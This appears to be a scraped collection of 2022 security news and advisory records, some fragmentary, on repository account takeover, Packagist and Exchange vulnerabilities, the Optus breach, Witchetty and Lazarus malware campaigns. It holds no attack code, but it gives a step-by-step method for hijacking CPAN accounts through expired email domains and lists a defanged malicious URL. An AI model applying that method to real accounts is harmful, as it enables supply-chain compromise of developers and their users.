400,000 projects. Developers at PyPI have email addresses associated with their accounts, however, PyPI does not display the email address publicly by default. This is an option that the developer must explicitly choose to enable. Many developers are, of course, eager to interact with others who are running their code, so it is no surprise that large numbers of developers enable this feature. PyPI accounts do not come with MFA enabled by default, so this is something else a developer would have to choose to enable. However, in July 2020 PyPi announced that it was rolling out mandatory MFA to ""critical projects,"" a.k.a. the top 1% of the projects at PyPi (based on the number of downloads). A list of all PyPI packages is available online. Many of these packages contain a mailto: link containing an email address. There is also a list of maintainers of the package. For developers that expose their email addresses publicly, it's found on the user's public profile page. It is a relatively simple process to scrape the email addresses associated with PyPI projects. PyPI reveals whether an email address is associated with an account (but it probably should not). Account takeovers have been a problem at PyPI in the past. As recently as May 14, 2022, an attacker managed to take over a developer account and replaced the ""ctx"" package , adding malicious code that stole the user's environment variables, base64-encoded them and transmitted the data back to the attacker's C2 server. Fortunately, the changes made by the admins over at PyPI seem to be moving account security in the right direction. CPAN The Comprehensive Perl Archive Network (CPAN) contains more than 200,000 Perl modules. CPAN also provides an index of all the module authors. The individual module authors each have their own ""homepage"" that lists their contributed modules. For anyone who wants to reach out to the dev, CPAN includes the author's email address. A motivated attacker can easily scrape the CPAN website for a list of all author IDs and use those to scrape the email address belonging to the developers. A whois search on the email domain of the developer email addresses provides us with a list of developer accounts that are vulnerable to account takeover. From there, all that is required is standing the domain up somewhere and running a mail server. Triggering a password reset provides us with the magic link to get into the developer's account. Talos has reached out to the admins at CPAN and provided them with a list of the vulnerable developer accounts we found. CPAN has disabled these accounts. NuGet NuGet is a software repository for .NET developers. The NuGet ""gallery"" contains more than 317,000 packages. Fortunately, registered developers at NuGet have their email addresses hidden by default. There is an option to allow users to contact you, using a form on the NuGet website that does not disclose the email address of the developer. Developers have the option of adding their Twitter handle, and many developers do. If an attacker wishes to attack NuGet developers en masse, they would have a very difficult time assembling a list of developer email addresses. RubyGems RubyGems is a software repository for Ruby developers. There are currently approximately 172,000 gems (packages) in the repository. Developer email addresses are hidden from the public by default. Even unchecking the ""Hide email in public profile"" check box has no discernable effect, and the email address remains hidden. Some gems have ""maintainers"" files to indicate the contact email addresses of the developers, but this is not consistent across gems. Recently, the RubyGems team announced that they are enforcing MFA for top developer accounts. Conclusion The software supply chain attack problem is not likely to go away anytime soon. It is unreasonable to ask organizations to vet every piece of software that runs in their environment. Some amount of trust in software vendors and suppliers will always be necessary. However, that doesn't mean that defenders are helpless against these types of attacks. Organizations should analyze what software is required on various internal systems. Many times, there may be opportunities to segment a group of systems running a particular piece of software from the rest of the internal network. This way, any compromise that occurs as a result of a software supply chain attack will be limited in scope. Obviously, there are limitations to this approach. All parties in the software supply chain need to take more responsibility for security. For example, it would be far safer for software repositories to stop publishing or releasing any information related to a developer's email address. Yes, this is arguably a bit of security-by-obscurity, but it forces attackers to go elsewhere to correlate the email account of a developer with the particular software package in question, and greatly enhances the security of the repository. If a repository wishes to publish a developer's email address, it could instead give each developer an email address at the domain of the repository itself (ex., @npmjs.com, @cpan.org, etc.). Forcing MFA on the most popular package maintainers also seems to be a sensible remedy that is currently being pursued by several repositories. However, security is always a delicate balance. If you sacrifice too much usability in the pursuit of security, developers may rebel, as was the case with PyPI developer ""untitaker."" One sure-fire countermeasure against developer account takeover via expired domain registration is code signing. This is really the best way to be sure that the code you use has not been tampered with since it was last signed, and is indeed from a developer you trust. An attacker who gets control of a developer's expired domain name would have no way to recover the code signing keys belonging to that developer and no way to impersonate that developer.",['On The Radar'],86e840e0-c115-5a3b-8c28-096050bee5d3," Why are software supply chain attacks so effective?

""This vulnerability allows gaining control of Packagist ,"" SonarSource researcher Thomas Chauchefoin said in a report shared with The Hacker News. Packagist is used by the PHP package manager Composer to determine and download software dependencies that are included by developers in their projects. The disclosure comes as planting malware in open source repositories is turning into an attractive conduit for performing software supply chain attacks . Tracked as CVE-2022-24828 (CVSS score: 8.8), the issue has been described as a case of command injection and is linked to another similar Composer bug ( CVE-2021-29472 ) that came to light in April 2021, suggesting an inadequate patch. ""An attacker controlling a Git or Mercurial repository explicitly listed by URL in a project's composer.json can use specially crafted branch names to execute commands on the machine running composer update,"" Packagist disclosed in an April 2022 advisory. A successful exploitation of the flaw meant that requests to update a package could have been hijacked to distribute malicious dependencies by executing arbitrary commands on the backend server running the official instance of Packagist. ""Compromising [the backend services] would allow attackers to force users to download backdoored software dependencies the next time they do a fresh install or an update of a Composer package,"" Chauchefoin explained. That said, there is no evidence the vulnerability has been exploited to date. Fixes have been deployed in Composer versions 1.10.26, 2.2.12, and 2.3.5 after SonarSource reported the flaw on April 7, 2022. Open source code has increasingly become a lucrative target of choice for threat actors owing to the ease with which they can be weaponized against the software supply chain . Earlier this April, SonarSource also detailed a 15-year-old security flaw in the PEAR PHP repository that could permit an attacker to obtain unauthorized access and publish rogue packages and execute arbitrary code. ""While supply chains can take different forms, one of them is significantly more impactful: By gaining access to the servers distributing these third-party software components, threat actors can alter them to obtain a foothold in the systems of their users,"" Chauchefoin said.",['Malware'],fc054751-1462-5f4d-b550-d19ded2e345b,"A now-patched high-severity security flaw in Packagist, a PHP software package repository, could have been exploited to mount software supply chain attacks.

Security cameras were once the preserve of the rich and famous. Now anyone can get their hands on one thanks to technological advances. The advent of the Internet of Things (IoT) has created a major new market – for manufacturers of devices like connected doorbells and baby monitors, and more sophisticated whole-of-property systems. Connected to home Wi-Fi networks, these devices allow owners to watch live video footage, record video for later and receive alerts when out of the house. Yet these same features can also expose households to new risks if the camera is compromised and/or the footage is leaked. Not all vendors have as big a focus on security and privacy as they should. That means you need to ask the right questions before starting. Here are some examples: First up, it’s time to decide if a home security camera is really necessary or if you’re only interested in getting one because everyone else seems to. Part of this decision-making process may be working out what type of set-up to get: whether you need a full CCTV system requiring professional installation, or a cheaper connected camera that can be up-and-running quickly and is controlled via a smartphone app. This is critical. While home security cameras are meant to protect the household, getting one might, in fact, unwittingly put the household at greater risk. In a worst-case scenario, remote or local hackers could access live feeds to spy on family members or case out the property to see if it’s empty. Both scenarios can be unnerving, especially as you would have little warning that this was happening. One way hackers could gain access to these feeds involves accessing the home wireless network, perhaps by guessing or brute-forcing the Wi-Fi password. A more likely scenario, however, is an attack in which they guess or crack your account passwords or exploit an unpatched firmware vulnerability . READ ALSO: D‑Link camera vulnerability allows attackers to tap into the video stream With so many models on the market, it pays to research what’s on offer, and the reputation of different vendors. If you’re serious about security, you’ll want a reputable brand with a strong track record on building reliable products with good consumer ratings for security and privacy. Things like prompt patching, strong encryption, enhanced log-in security and watertight privacy policies are important. And if engineers are required to fit a system, how much access are they granted? One US home security technician was able to spy on hundreds of homes over a four-and-a-half year period after adding his email on set-up. Another potential element of risk is related to the vendor itself. Do you know if the video data is stored on-site or in the provider’s cloud datacenter? In its latest transparency report, Amazon-owned Ring claimed to have turned over an unprecedented volume of its customers’ footage to the US authorities last year, including some cases without the consent of the device’s owner. Many camera owners may feel uncomfortable about such policies. Once you’re aware of the major security and privacy risks involved, it’s worth familiarizing yourself with what’s needed to ensure these devices run safely. Default passwords should always be changed to something strong and unique. For added safety, use two-factor authentication whenever it’s available. Also, devices should be regularly updated to the latest firmware. Choose a reputable vendor with a track record of manufacturing properly secured devices and shipping firmware updates. Switching off remote viewing of video footage will offer an added peace of mind and minimize the chances of a hacker accessing it. It’s not all about the settings on the camera itself. Your home router is the gateway to the smart home and could be a source of security risk if not properly configured. UPnP and port forwarding functions, which allow devices to find others on the same network, could be hijacked by hackers to access smart cameras. That’s why they should be switched off on the router, although it might prevent some applications and devices from working. READ ALSO: Privacy by Design: Can you create a safe smart home? As mentioned, it can be difficult to spot if a security camera has been hijacked. Two of the things to look out for would be abnormal movements of the camera or strange voices or sounds coming from it. If suddenly you can’t log in because the password to your account has changed, then that clearly isn’t a good sign either. Another possible avenue to consider is increased data usage or poor performance. If the device is being accessed by an unauthorized user, your camera may run slower because of limited memory and CPU power. This isn’t a fool-proof check though – it may also be the result of something more mundane like a poor internet connection. Getting a home security camera is not just about your own security and privacy. It could also impact the rights of your neighbors, if a camera captures images of people outside the boundary of your property. Under the GDPR, these individuals also have privacy rights that must be respected. It’s a good idea to position cameras so as to minimize any intrusion, and to be as transparent as possible with neighbors. The UK government has a good guide here. There’s plenty to consider before buying a home security system. And like any purchase, the more up-front research you can do on it, the better. BEFORE YOU GO: These things may be cool, but are they safe?",['Internet of Things'],161db055-ad67-5640-b603-1320c7f38364,"As each new smart home device may pose a privacy and security risk, do you know what to look out for before inviting a security camera into your home?

O’Neil said that the Australian Signals Directorate (ASD) had been working “broadly across the telecommunications sector” since Optus’ disclosure of a large-scale data breach last month. “I have advised previously that the ASD is working with other Australian telecommunications providers,” she said. “This is really important because what we’ll often see around the world is cyber security breaches come in sets, and we are doing a lot of work with telecommunications providers to ensure that their networks are free of vulnerabilities and that work is progressing very well.” O’Neil said that the sweep had not uncovered “any evidence” of a broader campaign against Australian telcos, nor of the presence of particularly critical vulnerabilities. “There isnt any evidence of that at this stage,” she said. “I’m not reporting on any additional vulnerabilities or breaches that they’ve found.” O’Neil, together with government services minister Bill Shorten, on Sunday called on Optus to be more transparent about how many customers had identity credentials exposed in the breach, with a breakdown by identity document type. She also said Optus needed to do more to contact 10,200 customers whose details were published to the internet by the alleged attacker.","['asd', 'data breach', 'optus', 'security', 'telco/isp']",030accee-dab2-5fdc-a12e-a015aa455b43," “I have advised previously that the ASD is working with other Australian telecommunications providers,” she said. “This is really important because what we’ll often see around the world is cyber security breaches come in sets, and we are doing a lot of work with telecommunications providers to ensure that their networks are free of vulnerabilities and that work is progressing very well.” O’Neil said that the sweep had not uncovered “any evidence” of a broader campaign against Australian telcos, nor of the presence of particularly critical vulnerabilities “There isnt any evidence of that at this stage"

Operation Guardian , launched Friday, covers “the Australian Federal Police, all state and territory Police, the Australian Cyber Security Centre (ACSC), the Australian Banking Association (ABA), IDCARE and the Customer Owned Banking Association”. The formation of ‘Operation Guardian’ appears to confirm the veracity of customer records that were published online by the alleged attacker as part of an extortion attempt. A forum user threatened to drip-feed stolen details online while a ransom was unpaid. One file was published, only to be removed, along with the threats to publish more - shortly after, though not before being accessed and analysed by users of other internet forums, which iTnews has chosen not to name or link to. Analysis of the file showed the extent of data fields that had been breached. There has been much speculation since then, inside and outside of cyber security circles, as to what led the forum user to suddenly change their mind. Operation Guardian appears to confirm what other internet users suspected though - that the leaked file of 10,200 records is genuine. “The AFP and state and territory police have set up Operation Guardian to supercharge the protection of more than 10,000 customers whose identification credentials have been unlawfully released online under the Optus data breach,” the agencies said in a statement. “Customers affected by the breach will receive multi-jurisdictional and multi-layered protection from identity crime and financial fraud. “The [10,200] individuals, who potentially had 100 points of identification released online, will be prioritised.” Under Operation Guardian, agencies will work to identify all the impacted customers and “alert industry to enable further protection for those members of the public”. They will also monitor for specific exploitation of this information, and work with the financial sector “to detect criminal activity associated with the data breach”. AFP assistant commissioner cyber command Justine Gough said while the online forum post advertising the stolen data for sale had been removed, “other criminals may have access to some, or all, of the data.” “Australian law enforcement are aware of current criminal activity attempting to target and exploit impacted Optus customers that have been the subject of this data breach,” Gough said. More than an email Home Affairs and cyber security minister Clare O'Neil said on Sunday that part of the AFP's work would involve directing Optus to properly inform people they are part of the 10,200. She indicated that so far, the 10,200 people had been notified only via email, and said she had expressed dissatisfaction with that approach directly to Optus CEO Kelly Bayer Rosmarin on Sunday morning. ""I gave very clear feedback to Optus that an email was not going to cut it here,"" O'Neil said. ""An email is simply not sufficient under these circumstances. We are going to need to go through a process of directly speaking with those 10,200 individuals, and Optus needs to take up the mantle here to make sure that people are aware when they are directly at risk, as those people are. ""I've talked to the AFP commissioner a number of times this morning and I've asked the two organisations to liaise to agree on what additional communication efforts need to be taken with regard to those specific people. ""I have no doubt Optus will be keenly ensuring that further communications are undertaken.""

""These attacks installed the Chopper web shell to facilitate hands-on-keyboard access, which the attackers used to perform Active Directory reconnaissance and data exfiltration,"" the Microsoft Threat Intelligence Center (MSTIC) said in a new analysis. The weaponization of the vulnerabilities is expected to ramp up in the coming days, Microsoft further warned, as malicious actors co-opt the exploits into their toolkits, including deploying ransomware, due to the ""highly privileged access Exchange systems confer onto an attacker."" The tech giant attributed the ongoing attacks with medium confidence to a state-sponsored organization, adding it was already investigating these attacks when the Zero Day Initiative disclosed the flaws to Microsoft Security Response Center (MSRC) earlier last month on September 8-9, 2022. The two vulnerabilities have been collectively dubbed ProxyNotShell , owing to the fact that ""it is the same path and SSRF/RCE pair"" as ProxyShell but with authentication, suggesting an incomplete patch. The issues, which are strung together to achieve remote code execution, are listed below - ""While these vulnerabilities require authentication, the authentication needed for exploitation can be that of a standard user,"" Microsoft said. ""Standard user credentials can be acquired via many different attacks, such as password spray or purchase via the cybercriminal economy."" The vulnerabilities were first discovered by Vietnamese cybersecurity company GTSC as part of its incident response efforts for an unnamed customer in August 2022. A Chinese threat actor is suspected to be behind the intrusions. The development comes as the U.S. Cybersecurity and Infrastructure Security Agency (CISA) added the two Microsoft Exchange Server zero-day vulnerabilities to its Known Exploited Vulnerabilities (KEV) catalog, requiring federal agencies to apply the patches by October 21, 2022. Microsoft said that it's working on an ""accelerated timeline"" to release a fix for the shortcomings. It has also published a script for the following URL Rewrite mitigation steps that it said is ""successful in breaking current attack chains"" - As additional prevention measures, the company is urging companies to enforce multi-factor authentication (MFA), disable legacy authentication , and educate users about not accepting unexpected two-factor authentication (2FA) prompts. ""Microsoft Exchange is a juicy target for threat actors to exploit for two primary reasons,"" Travis Smith, vice president of malware threat research at Qualys, told The Hacker News. ""First, Exchange [...] being directly connected to the internet creates an attack surface which is accessible from anywhere in the world, drastically increasing its risk of being attacked.

635124ad28e9d467ce428290,hackernew,https://thehackernews.com/2022/09/cyber-attacks-against-middle-east.html,Cyber Attacks Against Middle East Governments Hide Malware in Windows Logo,Ravie Lakshmanan,2022-09-30,"An espionage-focused threat actor has been observed using a steganographic trick to conceal a previously undocumented backdoor in a Windows logo in its attacks against Middle Eastern governments. Broadcom's Symantec Threat Hunter Team attributed the updated tooling to a hacking group it tracks under the name Witchetty , which is also known as LookingFrog , a subgroup operating under the TA410 umbrella. Intrusions involving TA410 – which is believed to share connections with a Chinese threat group known as APT10 (aka Cicada, Stone Panda, or TA429) – primarily feature a modular implant called LookBack. Symantec's latest analysis of attacks between February and September 2022, during which the group targeted the governments of two Middle Eastern countries and the stock exchange of an African nation, highlights the use of another backdoor dubbed Stegmap. The new malware leverages steganography – a technique used to embed a message (in this case, malware) in a non-secret document – to extract malicious code from a bitmap image of an old Microsoft Windows logo hosted on a GitHub repository. ""Disguising the payload in this fashion allowed the attackers to host it on a free, trusted service,"" the researchers said . ""Downloads from trusted hosts such as GitHub are far less likely to raise red flags than downloads from an attacker-controlled command-and-control (C&C) server."" Stegmap, like any other backdoor, has an extensive array of features that allows it to carry out file manipulation operations, download and run executables, terminate processes, and make Windows Registry modifications. Attacks that lead to the deployment of Stegmap weaponize ProxyLogon and ProxyShell vulnerabilities in Exchange Server to drop the China Chopper web shell, that's then used to carry out credential theft and lateral movement activities, before launching the LookBack malware. A timeline of an intrusion on a government agency in the Middle East reveals Witchetty maintaining remote access for as long as six months and mounting a wide range of post-exploitation efforts, including network enumeration and installing custom malware, until September 1, 2022. ""Witchetty has demonstrated the ability to continually refine and refresh its toolset in order to compromise targets of interest,"" the researchers said. ""Exploitation of vulnerabilities on public-facing servers provides it with a route into organizations, while custom tools paired with adept use of living-off-the-land tactics allow it to maintain a long-term, persistent presence in targeted organizations.""",['Malware'],e5239895-59b3-5355-ad5b-e77afe64e061,"An espionage-focused threat actor is using a steganographic trick to conceal a previously undocumented backdoor in a Windows logo in its attacks against Middle Eastern governments.

A large number of the vulnerabilities are different kinds of denial-of-service. CVE-2022-20837 is a bug in IOS XE’s NAT DNS implementation, and it allows an unauthenticated remote attacker to force the device to reload. “This vulnerability is due to a logic error that occurs when an affected device inspects certain TCP DNS packets. An attacker could exploit this vulnerability by sending crafted DNS packets through the affected device that is performing NAT for DNS packets,” the advisory stated. CVE-2022-20856 is another denial-of-service bug: control and provisioning messages to the wireless control software in the Catalyst 9000 family can be used to crash a target by causing resource exhaustion. In CVE-2022-20915 , the DoS attack is executed by sending crafted IPv6 packets that exploit a bug in IOS XE’s IPv6 VPN over MPLS implementation. Common Industrial Protocol packets are insufficiently validated by IOS XE in CVE-2022-20919 ; IPv4 packets can crash various Catalyst switches running IOS XE in CVE-2022-20870 ; and IOS’s or IOS XE’s SSH processing can be attacked in CVE-2022-20920 . The IOS XE wireless controller’s DHCP capability can be abused in some Catalyst switches ( CVE-2022-20847 ), and UDP processing on some Catalyst 9100 access points can be crashed ( CVE-2022-20848 ). The company’s AireOS wireless LAN controller software can also be hosed with crafted packets, in CVE-2022-20769 . Code execution If an attacker is more interested in arbitrary code execution, they could try and exploit CVE-2022-20855 . This bug exists in the self-healing functionality of Cisco IOS XE Software for Embedded wireless controllers on Catalyst access points: an authenticated local attacker can escape the shell and execute commands on the AP’s operating system as root. CVE-2022-20944 is another code execution bug, but it’s not easy to exploit. Cisco IOS XE for Catalyst 9200 switches allows an “unauthenticated, physical attacker to execute unsigned code at system boot time”. The bug would enable a supply chain attack – someone between vendor and customer could load malicious software on a switch, for example, because they can bypass the software image verification process. The last of the high-severity bugs is in Cisco’s SD-WAN controller: in CVE-2022-20775 and CVE-2022-20818, the command line interface has improper access controls, letting an attacker execute arbitrary commands as root.

635124b228e9d467ce4282c1,esentire,https://www.esentire.com/security-advisories/microsoft-exchange-vulnerabilities-exploited,Microsoft Exchange Vulnerabilities Exploited,Esentire,2022-09-30,"On September 29 th , 2022, GTSC disclosed two new vulnerabilities impacting Microsoft Exchange Servers. The vulnerabilities are tracked as CVE-2022-41040 (CVSS:8.8) and CVE-2022-41082 (CVSS:6.3). CVE-2022-41082 allows Remote Code Execution (RCE) when PowerShell is accessible to the attacker. CVE-2022-41040 is a Server-Side Request Forgery (SSRF) vulnerability. Microsoft has confirmed that authenticated access to the vulnerable Exchange server is required to exploit both vulnerabilities. The vulnerabilities impact Microsoft Exchange Server versions 2013, 2016, and 2019. Exploitation of CVE-2022-41040 and CVE-2022-41082 have been identified in the wild. Organizations are strongly recommended to apply the relevant mitigations provided by Microsoft. Once security patches are released, they should be applied as soon as possible. In these attacks, CVE-2022-41040 can enable an authenticated attacker to trigger CVE-2022-41082 remotely. It should be noted that authenticated access to the vulnerable Exchange Server is necessary to successfully exploit either of the two vulnerabilities. This is the same pair of exploits seen previously in the ProxyShell vulnerabilities . There is no known impact on Exchange functionality if the URL Rewrite module is installed as recommended. Researchers have dubbed these exploits ProxyNotShell, as it is the same path and SSRF/RCE pair required to exploit ProxyShell, with the additional requirement of authentication. GTSC’S Red team successfully used the above path to access a component in the Exchange backend and perform RCE. However, GTSC has not released technical details of the vulnerability yet. GTSC has seen customers experiencing a similar attack leading to webshell through Exchange services. Microsoft also verified limited targeted attacks using the two vulnerabilities. The impact has led to webshell installations aiming to exfiltrate information. There is no concrete attribution at this time, however, Tactics Techniques and Procedures (TTPs), such as the use of China Chopper webshell, align with Chinese-based threat actors. While Proof-of-Concept (PoC) exploit code is not currently available, the eSentire Threat Intelligence team asses with high confidence that the release of PoC code will result in an increase in real-world attacks against Exchange servers by multiple threat actor groups.

635124c728e9d467ce4283a6,hackernew,https://thehackernews.com/2022/09/warning-new-unpatched-microsoft.html,WARNING: New Unpatched Microsoft Exchange Zero-Day Under Active Exploitation,Ravie Lakshmanan,2022-09-30,"Security researchers are warning of previously undisclosed flaws in fully patched Microsoft Exchange servers being exploited by malicious actors in real-world attacks to achieve remote code execution on affected systems. The advisory comes from Vietnamese cybersecurity company GTSC, which discovered the shortcomings as part of its security monitoring and incident response efforts in August 2022. The two vulnerabilities, which are formally yet to be assigned CVE identifiers, are being tracked by the Zero Day Initiative as ZDI-CAN-18333 (CVSS score: 8.8) and ZDI-CAN-18802 (CVSS score: 6.3). GTSC said that successful exploitation of the flaws could be abused to gain a foothold in the victim's systems, enabling adversaries to drop web shells and carry out lateral movements across the compromised network. ""We detected web shells, mostly obfuscated, being dropped to Exchange servers,"" the company noted . ""Using the user-agent, we detected that the attacker uses Antsword, an active Chinese-based open source cross-platform website administration tool that supports web shell management."" Exploitation requests in IIS logs are said to appear in the same format as the ProxyShell Exchange Server vulnerabilities, with GTSC noting that the targeted servers had already been patched against the flaws that came to light in April 2021. The cybersecurity company theorized that the attacks are likely originating from a Chinese hacking group owing to the web shell's encoding in simplified Chinese ( Windows Code page 936 ). Also deployed in the attacks is the China Chopper web shell, a lightweight backdoor that can grant persistent remote access and allow attackers to reconnect at any time for further exploitation. It's worth noting that the China Chopper web shell was also deployed by Hafnium, a suspected state-sponsored group operating out of China, when the ProxyLogon vulnerabilities were subjected to widespread exploitation last year. Further post-exploitation activities observed by GTSC involve the injection of malicious DLLs into memory, drop and execute additional payloads on the infected servers using the WMI command-line ( WMIC ) utility. The company said at least more than one organization has been the victim of an attack campaign leveraging the zero-day flaws. Additional details about the bugs have been withheld in light of active exploitation. We have reached out to Microsoft for further comment, and we will update the story if we hear back. In the interim, as temporary workarounds, it's recommended to add a rule to block requests with indicators of compromise using the URL Rewrite Rule module for IIS servers - ""I can confirm significant numbers of Exchange servers have been backdoored – including a honeypot,"" security researcher Kevin Beaumont said in a series of tweets, adding, ""it looks like a variant of proxying to the admin interface again."" ""If you don't run Microsoft Exchange on premise, and don't have Outlook Web App facing the internet, you are not impacted,"" Beaumont said . Update: Microsoft has officially confirmed details of the two flaws, adding it's working to release a fix. More details here .",['Malware'],f9f6ede8-185d-5fe3-8a17-0fe07d8693e3,"Experts warn of previously undisclosed flaws in fully patched Microsoft Exchange servers being exploited in real-world attacks to achieve remote code execution on affected systems.

We also removed a section on MFA as a mitigation, which was included in a prior version of this blog as standard guidance. Microsoft is aware of limited targeted attacks using two reported zero-day vulnerabilities affecting Microsoft Exchange Server 2013, Exchange Server 2016, and Exchange Server 2019. The first one, identified as CVE-2022-41040, is a server-side request forgery (SSRF) vulnerability, while the second one, identified as CVE-2022-41082, allows remote code execution (RCE) when Exchange PowerShell is accessible to the attacker. Refer to the Microsoft Security Response Center blog for mitigation guidance regarding these vulnerabilities. CVE-2022-41040 can enable an authenticated attacker to remotely trigger CVE-2022-41082. However, authenticated access to the vulnerable Exchange Server is necessary to successfully exploit either vulnerability, and they can be used separately. Microsoft Defender Antivirus and Microsoft Defender for Endpoint detect malware and activity associated with these attacks. Microsoft will continue to monitor threats that take advantage of these vulnerabilities and take necessary response actions to protect customers. Analysis of observed activity Attacks using Exchange vulnerabilities prior to public disclosure MSTIC observed activity related to a single activity group in August 2022 that achieved initial access and compromised Exchange servers by chaining CVE-2022-41040 and CVE-2022-41082 in a small number of targeted attacks. These attacks installed the Chopper web shell to facilitate hands-on-keyboard access, which the attackers used to perform Active Directory reconnaissance and data exfiltration. Microsoft observed these attacks in fewer than 10 organizations globally. MSTIC assesses with medium confidence that the single activity group is likely to be a state-sponsored organization. Microsoft researchers were investigating these attacks to determine if there was a new exploitation vector in Exchange involved when the Zero Day Initiative (ZDI) disclosed CVE-2022-41040 and CVE-2022-41082 to Microsoft Security Response Center (MSRC) in September 2022. Figure 1: Diagram of attacks using Exchange vulnerabilities CVE-2022-41040 and CVE-2022-41082 Observed activity after public disclosure On September 28, 2022, GTSC released a blog disclosing an exploit previously reported to Microsoft via the Zero Day Initiative and detailing its use in an attack in the wild. Their blog details one example of chained exploitation of CVE-2022-41040 and CVE-2022-41082 and discusses the exploitation details of CVE-2022-41040. It is expected that similar threats and overall exploitation of these vulnerabilities will increase, as security researchers and cybercriminals adopt the published research into their toolkits and proof of concept code becomes available. While these vulnerabilities require authentication, the authentication needed for exploitation can be that of a standard user. Standard user credentials can be acquired via many different attacks, such as password spray or purchase via the cybercriminal economy. Prior Exchange vulnerabilities that require authentication have been adopted into the toolkits of attackers who deploy ransomware, and these vulnerabilities are likely to be included in similar attacks due to the highly privileged access Exchange systems confer onto an attacker. Mitigation Customers should refer to Microsoft Security Response Center’s post for the latest on mitigations for the Exchange product. Microsoft Exchange Server customers using Microsoft 365 Defender are advised to follow this checklist: Turn on cloud-delivered protection in Microsoft Defender Antivirus or the equivalent for your antivirus product to cover rapidly evolving attacker tools and techniques. Cloud-based machine learning protections block a huge majority of new and unknown variants. Turn on tamper protection features to prevent attackers from stopping security services. Run EDR in block mode so that Microsoft Defender for Endpoint can block malicious artifacts, even when your non-Microsoft antivirus doesn’t detect the threat or when Microsoft Defender Antivirus is running in passive mode. EDR in block mode works behind the scenes to remediate malicious artifacts that are detected post-breach. Enable network protection to prevent applications or users from accessing malicious domains and other malicious content on the internet. Enable investigation and remediation in full automated mode to allow Microsoft Defender for Endpoint to take immediate action on alerts to resolve breaches, significantly reducing alert volume. Use device discovery to increase your visibility into your network by finding unmanaged devices on your network and onboarding them to Microsoft Defender for Endpoint. Detection Microsoft Defender Antivirus Microsoft Exchange AMSI integration and Antivirus Exclusions Exchange supports the integration with the Antimalware Scan Interface (AMSI) since the June 2021 Quarterly Updates for Exchange. It is highly recommended to ensure these updates are installed and AMSI is working using the guidance provided by the Exchange Team , as this integration provides the best ability for Defender Antivirus to detect and block exploitation of vulnerabilities on Exchange. Many organizations exclude Exchange directories from antivirus scans for performance reasons. It’s highly recommended to audit AV exclusions on Exchange systems and assess if they can be removed without impacting performance and still ensure the highest level of protection. Exclusions can be managed via Group Policy, PowerShell, or systems management tools like System Center Configuration Manager. To audit AV exclusions on an Exchange Server running Defender Antivirus, launch the Get-MpPreference command from an elevated PowerShell prompt. If exclusions cannot be removed for Exchange processes and folders, running Quick Scan in Defender Antivirus scans Exchange directories and files regardless of exclusions.

635124ac28e9d467ce428287,welivesec,https://www.welivesecurity.com/2022/09/30/amazon-themed-campaigns-lazarus-netherlands-belgium/,Amazon‑themed campaigns of Lazarus in the Netherlands and Belgium,Peter Kálnai,2022-09-30,"ESET researchers have discovered Lazarus attacks against targets in the Netherlands and Belgium that use spearphishing emails connected to fake job offers ESET researchers uncovered and analyzed a set of malicious tools that were used by the infamous Lazarus APT group in attacks during the autumn of 2021. The campaign started with spearphishing emails containing malicious Amazon-themed documents and targeted an employee of an aerospace company in the Netherlands, and a political journalist in Belgium. The primary goal of the attackers was data exfiltration. Lazarus (also known as HIDDEN COBRA) has been active since at least 2009. It is responsible for high-profile incidents such as both the Sony Pictures Entertainment hack and tens-of-millions-of-dollar cyberheists in 2016 , the WannaCryptor (aka WannaCry) outbreak in 2017, and a long history of disruptive attacks against South Korean public and critical infrastructure since at least 2011. Both targets were presented with job offers – the employee in the Netherlands received an attachment via LinkedIn Messaging, and the person in Belgium received a document via email. Attacks started after these documents were opened. The attackers deployed several malicious tools on each system, including droppers, loaders, fully featured HTTP(S) backdoors, HTTP(S) uploaders and downloaders. The commonality between the droppers was that they are trojanized open-source projects that decrypt the embedded payload using modern block ciphers with long keys passed as command line arguments. In many cases, malicious files are DLL components that were side-loaded by legitimate EXEs, but from an unusual location in the file system. The most notable tool delivered by the attackers was a user-mode module that gained the ability to read and write kernel memory due to the CVE-2021-21551 vulnerability in a legitimate Dell driver. This is the first ever recorded abuse of this vulnerability in the wild. The attackers then used their kernel memory write access to disable seven mechanisms the Windows operating system offers to monitor its actions, like registry, file system, process creation, event tracing etc., basically blinding security solutions in a very generic and robust way. In this blogpost, we explain the context of the campaign and provide a detailed technical analysis of all the components. This research was presented at this year’s Virus Bulletin conference . Because of the originality, the main focus of the presentation is on the malicious component used in this attack that uses the Bring Your Own Vulnerable Driver (BYOVD) technique and leverages the aforementioned CVE-2021-21551 vulnerability. Detailed information is available in the white paper Lazarus & BYOVD: Evil to the Windows core . We attribute these attacks to Lazarus with high confidence, based on the specific modules, the code-signing certificate, and the intrusion approach in common with previous Lazarus campaigns like Operation In(ter)ception and Operation DreamJob . The diversity, number, and eccentricity in implementation of Lazarus campaigns define this group, as well as that it performs all three pillars of cybercriminal activities: cyberespionage, cybersabotage, and pursuit of financial gain. ESET researchers discovered two new attacks: one against personnel of a media outlet in Belgium and one against an employee of an aerospace company in the Netherlands. In the Netherlands, the attack affected a Windows 10 computer connected to the corporate network, where an employee was contacted via LinkedIn Messaging about a supposed potential new job, resulting in an email with a document attachment being sent. We contacted the security practitioner of the affected company, who was able to share the malicious document with us. The Word file Amzon_Netherlands.docx sent to the target is merely an outline document with an Amazon logo (see Figure 1). When opened, the remote template https://thetalkingcanvas[.]com/thetalking/globalcareers/us/5/careers/jobinfo.php?image=<var>_DO.PROJ (where <var> is a seven-digit number) is fetched. We were unable to acquire the content, but we assume that it may have contained a job offer for the Amazon space program, Project Kuiper . This is a method that Lazarus practiced in the Operation In(ter)ception and Operation DreamJob campaigns targeting aerospace and defense industries. Figure 1. Amazon-themed document sent to the target in the Netherlands Within hours, several malicious tools were delivered to the system, including droppers, loaders, fully featured HTTP(S) backdoors, HTTP(S) uploaders and HTTP(S) downloaders; see the Toolset section. Regarding the attack in Belgium, the employee of a journalism company (whose email address was publicly available on the company’s website) was contacted via an email message with the lure AWS_EMEA_Legal_.docx attached. Since we didn’t obtain the document, we know only its name, which suggests it might have been making a job offer in a legal position. After opening the document, the attack was triggered, but stopped by ESET products immediately, with just one malicious executable involved. The interesting aspect here is that, at that time, this binary was validly signed with a code-signing certificate. We attribute both attacks to the Lazarus group with a high level of confidence. This is based on the following factors, which show relationships to other Lazarus campaigns: One of the typical traits of Lazarus is its delivery of the final payload in the form of a sequence of two or three stages. It starts with a dropper – usually a trojanized open-source application – that decrypts the embedded payload with a modern block cipher like AES-128 (which is not unusual for Lazarus, e.g., Operation Bookcodes , or an obfuscated XOR, after parsing the command line arguments for a strong key. Despite the embedded payload not being dropped onto the file system but loaded directly into memory and executed, we denote such malware as a dropper. Malware that doesn’t have an encrypted buffer, but that 